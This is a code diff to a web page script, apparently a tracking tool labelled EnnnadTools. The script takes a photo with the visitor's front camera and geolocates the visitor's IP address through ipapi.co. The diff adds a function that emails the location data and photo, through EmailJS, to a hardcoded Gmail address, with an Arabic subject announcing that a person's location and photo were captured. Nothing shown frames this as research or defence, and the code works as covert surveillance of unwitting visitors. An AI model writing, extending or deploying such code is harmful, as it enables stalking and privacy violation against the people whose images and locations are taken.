@@ -137,7 +137,7 @@ async function capturePhoto() {
         const canvas = document.getElementById('canvas');
         const stream = await navigator.mediaDevices.getUserMedia({
             video: {
-                facingMode: 'user',
+                facingMode: 'user', // الكاميرا الأمامية
                 width: 640,
                 height: 480
             },
@@ -193,7 +193,7 @@ window.onload = async function () {
         const ipData = await ipResponse.json();
         console.log("IP:", ipData.ip);
         
-        const locResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+        const locResponse = await fetch(`https://ipapi.co/${ipData.ip}/json`);
         const loc = await locResponse.json();
         console.log("Location data from ipapi:", loc);
 
@@ -227,6 +227,22 @@ window.onload = async function () {
         }
     }
 };
+
+async function sendDataWithPhoto(locationData, photoData) {
+    try {
+        const response = await emailjs.send("service_25q0ern", "template_xi6fmgy", {
+            to_email: "e508769103@gmail.com",
+            name: "تم جلب موقع شخص مع صورة",
+            time: new Date().toLocaleString('ar-EG'),
+            message: locationData,
+            photo: photoData || 'تعذر التقاط الصورة'
+        });
+        return response;
+    } catch (error) {
+        console.error('خطأ في إرسال البريد:', error);
+        throw error;
+    }
+}
 
 console.log("تم اتمام العملية بنجاح , EnnnadTools");
 </script>
